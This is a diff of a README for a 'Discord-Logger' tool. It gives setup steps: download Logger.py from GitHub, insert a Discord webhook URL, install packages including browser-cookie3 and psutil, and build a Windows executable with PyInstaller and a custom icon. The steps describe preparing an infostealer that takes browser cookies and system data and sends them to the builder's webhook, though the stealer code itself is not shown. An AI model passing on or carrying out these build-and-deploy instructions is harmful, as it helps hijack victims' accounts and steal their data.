@@ -3,30 +3,16 @@
 Requirements:\
 • Python 3.9 or higher(I used 3.9.12)\
 • A windows machine\
-• VScode(optional but highly useful)
-• An .ico file (Icon)
+• VScode(optional but highly useful) \
+• An .ico file (Optional)
 
 # Steps:
 \
 Make a new .py file and replace its contents with https://github.com/TurtlesXD/Discord-Logger/blob/main/Logger.py \
 Make a Discord wehbook in yout server and copy its URl \
 Replace YourWebhookURL with your url in line 14 of the code\
-Now create a new file called requirements.txt\
-Replace its contents with this:
-```
-discord-webhook==1.0.0
-browser-cookie3==0.16.2
-psutil==5.9.4
-requests==2.28.1
-```
-Then open a terminal(I use VSCODE built in terminal)\
-and run this command:
-```
-pip install -r Path-to-requirements.txt
-```
-this will download all nessecary 3rd party packages\
-\
-If you dont already have Pyinstaller, run this command:
+Download all libraries using pip\
+If you dont already have Pyinstaller, run this command in a terminal:
 ```
 pip install pyinstaller
 ```
